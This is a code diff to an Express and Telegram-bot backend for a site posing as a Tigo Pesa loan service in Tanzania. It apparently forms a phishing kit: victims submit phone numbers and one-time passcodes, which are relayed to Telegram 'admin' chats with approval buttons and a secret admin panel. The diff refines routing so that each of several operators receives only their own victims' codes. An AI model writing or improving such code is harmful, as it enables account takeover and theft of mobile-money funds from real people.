@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - UNINTERRUPTED & STRICTLY ISOLATED BACKEND SERVER**
+ * **MIXX BY YAS - STRICTLY ISOLATED MULTI-ADMIN ROUTING SERVER**
  */
 
 const express = require('express');
@@ -24,12 +24,11 @@ let bot = null;
 const sessions = new Map();
 
 /**
- * **FAIL-SAFE & ISOLATED RESOLUTION**
- * Resolves chat ID from environment variables and provides a guaranteed fallback 
- * if any parameter format varies, preventing message loss.
+ * **STRICT ENVIRONMENT-BASED RESOLUTION**
+ * Maps codes explicitly to environment variables so Admin 02 never defaults to Admin 01.
  */
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return process.env.ADMIN_01 || null;
+  if (!adminKeyOrId) return null;
   const cleanKey = String(adminKeyOrId).toUpperCase().padStart(2, '0');
   
   const envVarName = `ADMIN_${cleanKey}`;
@@ -37,7 +36,7 @@ function resolveAdminChatId(adminKeyOrId) {
     return process.env[envVarName];
   }
   
-  return adminKeyOrId || process.env.ADMIN_01 || null;
+  return adminKeyOrId;
 }
 
 function isValidTigoNumber(phoneStr) {
@@ -99,8 +98,19 @@ async function initBot() {
     const username = user.username ? `@${user.username}` : 'No username set';
     
     let assignedCode = '01';
-    if (chatId === process.env.ADMIN_02) assignedCode = '02';
-    else if (chatId === process.env.ADMIN_01) assignedCode = '01';
+    if (chatId === process.env.ADMIN_02) {
+      assignedCode = '02';
+    } else if (chatId === process.env.ADMIN_01) {
+      assignedCode = '01';
+    } else {
+      for (let i = 1; i <= 10; i++) {
+        const codeStr = String(i).padStart(2, '0');
+        if (process.env[`ADMIN_${codeStr}`] === chatId) {
+          assignedCode = codeStr;
+          break;
+        }
+      }
+    }
 
     const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
     const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
@@ -133,7 +143,11 @@ async function initBot() {
         return;
       }
 
-      const chatTarget = session.adminChatId || process.env.ADMIN_01;
+      const chatTarget = session.adminChatId;
+      if (!chatTarget) {
+        await bot.answerCallbackQuery(query.id, { text: '⚠️ Admin destination missing.' });
+        return;
+      }
 
       switch (prefix) {
         case 'ALLOW_OTP':
@@ -193,7 +207,7 @@ app.post('/api/submit-application', (req, res) => {
 
     const targetChat = resolveAdminChatId(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Destination admin chat ID unavailable.' });
+      return res.status(400).json({ success: false, error: 'Invalid or missing admin mapping destination.' });
     }
 
     const userId = phone || `user_${Date.now()}`;
@@ -279,8 +293,10 @@ app.post('/api/submit-otp', (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId || process.env.ADMIN_01;
-    bot.sendMessage(targetChat, message, opts).catch(() => {});
+    const targetChat = session.adminChatId;
+    if (targetChat) {
+      bot.sendMessage(targetChat, message, opts).catch(() => {});
+    }
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -302,8 +318,10 @@ app.post('/api/request-new-otp', (req, res) => {
       `📱 *Tigo User:* +255 ${session.phone}\n` +
       `⚠️ The user's countdown expired and they requested a new OTP code.`;
 
-    const targetChat = session.adminChatId || process.env.ADMIN_01;
-    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
+    const targetChat = session.adminChatId;
+    if (targetChat) {
+      bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
+    }
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -316,4 +334,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-          
+    
